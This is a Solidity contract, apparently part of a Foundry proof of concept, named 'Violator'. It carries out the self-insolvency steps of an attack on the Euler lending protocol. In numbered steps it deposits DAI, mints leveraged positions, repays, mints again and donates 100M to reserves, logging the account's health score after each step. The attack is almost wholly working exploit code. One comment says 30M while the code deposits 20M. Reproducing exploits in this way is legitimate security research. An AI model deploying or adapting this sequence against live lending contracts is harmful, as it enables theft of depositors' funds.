// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
import { IEToken } from "./interface/IEToken.sol";
import { IDToken } from "./interface/IDToken.sol";
import { ILiquidation } from "./interface/ILiquidation.sol";
import { IMarkets } from "./interface/IMarkets.sol";
import { IRiskManager } from "euler-contracts/contracts/IRiskManager.sol";

import "forge-std/src/Test.sol";

contract Violator {
    IERC20 immutable UNDERLYING;
    IEToken immutable eToken;
    IDToken immutable dToken;
    address immutable EULER;
    IMarkets immutable MARKETS;
    ILiquidation immutable LIQUIDATION;
    address person;
    IRiskManager immutable RISK_MANAGER;

    event log_named_decimal_uint (string key, uint val, uint decimals);

    constructor(IERC20 _dai, IEToken _eToken, IDToken _dToken, address _euler, ILiquidation _liquidation, IMarkets _markets, address _person) {
        UNDERLYING = _dai;
        eToken = _eToken;
        dToken = _dToken;
        EULER = _euler;
        MARKETS = _markets;
        LIQUIDATION = _liquidation;
        person = _person;
    }

    function violate() external {
        //IRiskManager.LiquidityStatus memory status = MARKETS.getLiquidityStatus(address(this));
        //emit log_named_decimal_uint("collateral value after depositing", status.collateralValue, 18);
        //emit log_named_decimal_uint("liability value after depositing", status.liabilityValue, 18);

        // for safeTransferFrom in deposit
        UNDERLYING.approve(EULER, type(uint256).max);
        
        // 3. Deposit 30M DAI 
        eToken.deposit(0, 20_000_000 * 1e18);
        MARKETS.getUserAsset("After depositing (violator): ", address(eToken), IERC20(UNDERLYING).symbol(), address(this));
        console.log(" ");

        // 4. Borrow (mint) 10 x deposit
        eToken.mint(0, 200_000_000 * 1e18);
        MARKETS.getUserAsset("After minting (violator): ", address(eToken), IERC20(UNDERLYING).symbol(), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(UNDERLYING), address(UNDERLYING)).healthScore, 18);
        console.log(" ");

        // 5. Repay 10M DAI
        dToken.repay(0, 10_000_000 * 1e18);

        MARKETS.getUserAsset("After repaying (violator): ", address(eToken), IERC20(UNDERLYING).symbol(), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(UNDERLYING), address(UNDERLYING)).healthScore, 18);
        console.log(" ");

        // 6. Mint 10 x deposit again
        eToken.mint(0, 200_000_000 * 1e18);
        MARKETS.getUserAsset("After minting (violator): ", address(eToken), IERC20(UNDERLYING).symbol(), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(UNDERLYING), address(UNDERLYING)).healthScore, 18);
        console.log(" ");
        
        // 7. Donate 100M DAI
        eToken.donateToReserves(0, 100_000_000 * 1e18);
        MARKETS.getUserAsset("After donating (violator): ", address(eToken), IERC20(UNDERLYING).symbol(), address(this));
        emit log_named_decimal_uint("Health score", LIQUIDATION.checkLiquidation(person, address(this), address(UNDERLYING), address(UNDERLYING)).healthScore, 18);
        console.log(" ");
    }
}